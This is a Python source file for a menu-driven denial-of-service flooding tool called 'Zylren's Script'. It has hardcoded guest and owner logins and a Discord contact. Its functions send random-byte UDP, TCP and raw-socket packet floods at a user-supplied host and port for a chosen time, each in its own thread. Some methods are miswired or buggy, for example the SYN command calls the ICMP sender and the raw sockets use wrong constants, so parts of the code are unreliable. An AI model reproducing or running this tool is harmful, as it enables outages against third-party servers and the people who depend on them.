#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;Zylrens Script\x07")
def modifications():
	print ("Contact Zylren The Script Is Currently Under Maitnance.")
	on_enter = input("Press Enter To Leave.")
	exit()
#column:65
methods = """\033[91m
\033[1;36;40m╔══════════════════════════════════════════════════════╗
\033[1;36;40m║                     \033[1;34;40mDDOS \033[1;31;40mMETHODS\033[1;36;40m                     ║               
\033[1;36;40m║══════════════════════════════════════════════════════║
\033[1;36;40m║ \033[1;34;40mUDP  (HOST) (PORT) (TIME) (SIZE) \033[1;36;40m|\033[1;31;40m UDP ATTACK\033[1;36;40m        ║
\033[1;36;40m║ \033[1;34;40mSYN  (HOST) (PORT) (TIME) (SIZE) \033[1;36;40m|\033[1;31;40m SYN ATTACK\033[1;36;40m        ║
\033[1;36;40m║ \033[1;34;40mSTD  (HOST) (PORT) (TIME) (SIZE) \033[1;36;40m|\033[1;31;40m STD ATTACK\033[1;36;40m        ║
\033[1;36;40m║ \033[1;34;40mICMP (HOST) (PORT) (TIME) (SIZE) \033[1;36;40m|\033[1;31;40m ICMP ATTACK\033[1;36;40m       ║
\033[1;36;40m║ \033[1;34;40mHTTP (HOST) (PORT) (TIME) (SIZE) \033[1;36;40m|\033[1;31;40m HTTP ATTACK\033[1;36;40m       ║
\033[1;36;40m║ \033[1;34;40mNTP  (HOST) (PORT) (TIME) (SIZE) \033[1;36;40m|\033[1;31;40m NTP  ATTACK\033[1;36;40m       ║
\033[1;36;40m║ \033[1;34;40mLAYER7(HOST) (PORT) (TIME) (SIZE)\033[1;36;40m|\033[1;31;40m LAYER7 ATTACK\033[1;36;40m     ║
\033[1;36;40m╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """
Discord: Zylren#9616
"""

help = """\033[91m
\033[1;36;40m╔══════════════════════════════════════════════════════╗
\033[1;36;40m║                    \033[1;34;40mCOMM\033[1;31;40mANDS\033[1;36;40m                          ║
\033[1;36;40m║══════════════════════════════════════════════════════║
\033[1;36;40m║ \033[1;34;40mmethods \033[1;36;40m|\033[1;31;40m ZYLRENS METHODS\033[1;36;40m                            ║
\033[1;36;40m║ \033[1;34;40mtools   \033[1;36;40m|\033[1;31;40m BASIC TOOLS\033[1;36;40m                                ║
\033[1;36;40m║ \033[1;34;40mupdates \033[1;36;40m|\033[1;31;40m DISPLAYS UPDATE NOTES\033[1;36;40m                      ║
\033[1;36;40m║ \033[1;34;40minfo    \033[1;36;40m|\033[1;31;40m DISPLAYS ZYLRENS INFO\033[1;36;40m                      ║
\033[1;36;40m║ \033[1;34;40mclear   \033[1;36;40m|\033[1;31;40m CLEARS SCREEN\033[1;36;40m                              ║
\033[1;36;40m║ \033[1;34;40mexit    \033[1;36;40m|\033[1;31;40m EXITS SCRIPT\033[1;36;40m                               ║
\033[1;36;40m╚══════════════════════════════════════════════════════╝\033[00m
"""

tools = """\033[91m
\033[1;36;40m╔══════════════════════════════════════════════════════╗
\033[1;36;40m║                        \033[1;34;40mTO\033[1;31;40mOLS\033[1;36;40m                         ║
\033[1;36;40m║══════════════════════════════════════════════════════║
\033[1;36;40m║ \033[1;34;40mstopattacks             \033[1;36;40m|\033[1;31;40m STOPS ALL ATTACKS\033[1;36;40m          ║
\033[1;36;40m║ \033[1;34;40mattacks                 \033[1;36;40m|\033[1;31;40m SHOWS RUNNING ATTACKS\033[1;36;40m      ║
\033[1;36;40m║ \033[1;34;40mping (HOST) (PORT)      \033[1;36;40m|\033[1;31;40m PINGS A HOST\033[1;36;40m               ║
\033[1;36;40m║ \033[1;34;40mresolve (HOST)          \033[1;36;40m|\033[1;31;40m GRABS A DOMAINS IP\033[1;36;40m         ║
\033[1;36;40m╚══════════════════════════════════════════════════════╝\033[00m
"""

updatenotes = """\033[91m
\033[1;36;40m╔══════════════════════════════════════════════════════╗
\033[1;36;40m║                     \033[00mUPDATE NOTES\033[91m                     ║
\033[1;36;40m║══════════════════════════════════════════════════════                ║
\033[1;36;40m║ \033[1;34;40m[*] Added STD Method.\033[1;36;40m                                ║
\033[1;36;40m║ \033[1;31;40m[*] Added HTTP Method.\033[1;36;40m                               ║
\033[1;36;40m║ \033[1;34;40m[*] Added Layer7 Method.\033[1;36;40m                             ║
\033[1;36;40m║ \033[1;31;40m[*] Added Ntp Method.\033[91m                                ║
\033[1;36;40m║ \033[1;34;40m[*] To Be A Guest Type "guest" For User And Pass.\033[1;36;40m    ║
\033[1;36;40m║ \033[1;31;40m[*] All Tools Fixed And Working.\033[91m                     ║
\033[1;36;40m╚══════════════════════════════════════════════════════╝\033[00m
"""

banner = """               
\033[1;34;40m███████╗██╗   ██╗██╗     ██████╗ ███████╗███╗   ██╗    
\033[1;31;40m╚══███╔╝╚██╗ ██╔╝██║     ██╔══██╗██╔════╝████╗  ██║    
\033[1;34;40m  ███╔╝  ╚████╔╝ ██║     ██████╔╝█████╗  ██╔██╗ ██║    
\033[1;31;40m ███╔╝    ╚██╔╝  ██║     ██╔══██╗██╔══╝  ██║╚██╗██║    
\033[1;34;40m███████╗   ██║   ███████╗██║  ██║███████╗██║ ╚████║    
\033[1;31;40m╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   
"""

cookie = open(".Zylrens_Cookie","w+")

fsubs = 0
tpings = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
std = True
layer7 = True
ntp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http
	global std

	while True:
		sys.stdout.write("\x1b]2;Made By Zylren\x07")
		sin = input("\033[1;00m[\033[91mZylren\033[1;00m]# ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "methods":
			print (methods)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mZylren\033[00m] Total Attacks: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mZylren\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mZylren\033[00m] Starting Ping On Host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mZylren\033[00m] Host Un-Resolvable.")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;Z Y L R E N[()ms]Z Y L R E N\x07".format (stop))
						print ("Zylren: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;Z Y L R E N |TIME OUT|Z Y L R E N\x07")
						print ("Zylren: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mZylren\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[91mZylren\033[00m] You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mZylren\033[00m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mZylren\033[00m] Host: {} Invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mZylren\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mZylren\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "std":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mZylren\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mZylren\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("[\033[91mZylren\033[00m] You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mZylren\033[00m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mZylren\033[00m] Host: {} Invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mZylren\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mZylren\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mZylren\033[00m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mZylren\033[00m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[91mZylren\033[00m] {} Is Not A Command.".format(sinput))
			main()



try:
	users = ["Zylren", "guest"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[*] Username: ")
	if username in users:
		user = username
	else:
		print ("[*] Incorrect, Exiting.")
		exit()
except KeyboardInterrupt:
	print ("\nCtrl-C Has Been Pressed.")
	exit()
try:
	passwords = ["Zylren", "guest"]
	password = getpass.getpass ("[*] Password: ")
	if user == "Zylren":
		if password == passwords[0]:
			print ("[*] Login Correct.")
			print ("[*] Type help To See Commands.")
			cookie.write("SPACE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mZylren\033[00m] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
	if user == "guest":
		if password == passwords[1]:
			print ("[*] Login Correct.")
			print ("[*] Certain Methods Will Not Be Available To You.")
			print ("[*] Type help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mZylren\033[00m] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
except KeyboardInterrupt:
	exit()
